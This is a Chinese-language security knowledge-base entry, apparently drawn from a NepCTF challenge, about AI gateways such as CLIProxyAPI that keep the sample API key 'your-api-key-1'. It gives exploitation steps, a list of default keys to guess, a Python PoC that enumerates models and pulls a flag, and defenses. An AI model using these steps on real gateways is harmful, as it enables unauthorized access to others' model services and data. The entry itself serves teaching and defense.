---
id: ai-security-gateway-security-cliproxyapi-default-api-key
title: CLIProxyAPI 默认 API Key 未改：your-api-key-1 直接调用模型接口与 flag 模型
type: scenario
domain: ai-security
path: ai-security/gateway-security
technique: cliproxyapi-default-api-key
aliases:
- CLIProxyAPI 默认密钥
- your-api-key-1
- AI 网关默认凭据
- OpenAI 兼容接口未授权
- NepAPI
- 默认 api key 未修改
tags:
- ai-security
- gateway
- api-key
- default-credential
- openai-compatible
- unauthorized
- llm
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:56:37+08:00'
  notes: 已对照原文 §NepAPI 核对：/v1/models 无 key 返回 invalid api key、your-api-key-1 可列出 nepapi-flag-model、/v1/chat/completions 直接返回 flag 均一致；未本机复跑。
---

## 一句话结论

CLIProxyAPI 等 OpenAI 兼容中转/网关如果保留示例默认 API Key `your-api-key-1`，攻击者无需任何凭据即可通过 `GET /v1/models` 枚举模型（案例中直接看到 `nepapi-flag-model`），再用 `POST /v1/chat/completions` 与默认 key 调用该模型获取 flag。

## 原理

- AI 网关/中转（CLIProxyAPI、LiteLLM、One API 等）通常提供 OpenAI 兼容的 `/v1/models`、`/v1/chat/completions` 接口，用 `Authorization: Bearer <api-key>` 鉴权。
- 为了开箱即用，示例配置/文档会给出默认 key（如 `your-api-key-1`、`sk-xxx`）；部署者若只改上游 provider key 而忘记改网关自身的客户端 key，默认 key 仍然有效。
- 未带鉴权访问 `/v1/models` 会返回 `invalid api key`，这只是提示缺少 key，不代表默认 key 已禁用；用示例 key 重试即可验证。
- `/v1/models` 会列出网关聚合的所有模型，包括题目故意暴露的 flag 模型；`/v1/chat/completions` 可直接向该模型提问，模型返回 flag。
- 根因是默认凭据 + 模型清单暴露 + 模型本身被配置为可回答敏感内容；不是模型越狱或提示注入。

## 触发条件

- 目标暴露 OpenAI 兼容网关/中转接口（`/v1/models`、`/v1/chat/completions`）。
- 网关保留默认/示例 API Key，或 key 可从前端/文档/仓库中猜到。
- 网关聚合的模型列表包含敏感模型（如 flag 模型、内部业务模型）。
- 攻击者能访问网关端口/域名。

## 利用步骤

1. 访问 `/v1/models`，观察是否返回 `invalid api key` 或模型列表。
2. 尝试常见默认 key：`your-api-key-1`、`sk-xxx`、`changeme`、`admin`、部署文档示例值。
3. 用有效 key 列出模型，记录 `id`、`owned_by` 等字段，寻找敏感/flag 模型。
4. 调用 `/v1/chat/completions`，`model` 填目标模型，发送无害问题；读取 `choices[0].message.content`。
5. 若返回内容含 flag/敏感信息，记录请求与响应作为证据；控制请求频率，避免滥用。
6. 若默认 key 无效，检查前端 JS/配置/开源仓库中的示例 key，或尝试未授权管理接口。

## PoC

```python
import requests

BASE = "https://target"
headers = {"Authorization": "Bearer your-api-key-1", "Content-Type": "application/json"}

models = requests.get(f"{BASE}/v1/models", headers=headers, verify=False, timeout=10).json()
print(models)  # {"object":"list","data":[{"id":"nepapi-flag-model",...}]}

payload = {
    "model": "nepapi-flag-model",
    "messages": [{"role": "user", "content": "Hello. What can you do?"}],
}
r = requests.post(f"{BASE}/v1/chat/completions", headers=headers,
                  json=payload, verify=False, timeout=30)
print(r.json()["choices"][0]["message"]["content"])
```

案例输出：`NepCTF{OhhHHH-y0u-nOw_hOw_t0_GeT_SHIt_Def4U1t_K3y672}`。

## 变体与关联

- 变体：默认 key 只对 `/v1/models` 有效、对 chat 无效，或反过来；分别测试。
- 变体：网关管理接口（`/v0/management/status`、`/admin`）未鉴权，可直接读取配置/模型/上游 key。
- 变体：默认 key 被前端 JS 硬编码，或出现在 Docker Compose/README 中；从公开仓库/镜像中收集。
- 关联：[[ai-security-gateway-security-litellm-public-routes-debug-log-disclosure]]（LiteLLM 公开路由/日志泄露）、[[web-generic-auth-qdrant-internal-grpc-auth-bypass]]（AI 基础设施鉴权缺失）、[[ai-security-agent-security-llm-relay-baseurl-tool-call-hijack]]（中转节点风险）。

## 检测与防御

- 防御：部署后立即修改网关自身的 API Key，禁用示例 key；用强随机 key 并定期轮换。
- 防御：`/v1/models` 只返回调用者有权访问的模型；管理接口单独鉴权并限制来源 IP。
- 防御：不要把 flag/敏感模型与普通模型混在同一网关；对模型调用做审计、配额与内容策略。
- 检测：使用 `your-api-key-1` 等默认 key 的请求；短时间内枚举模型/大量调用敏感模型；管理接口异常访问。
- 响应：轮换 key、下线敏感模型、审计调用日志与上游账单，检查是否已有数据外泄。
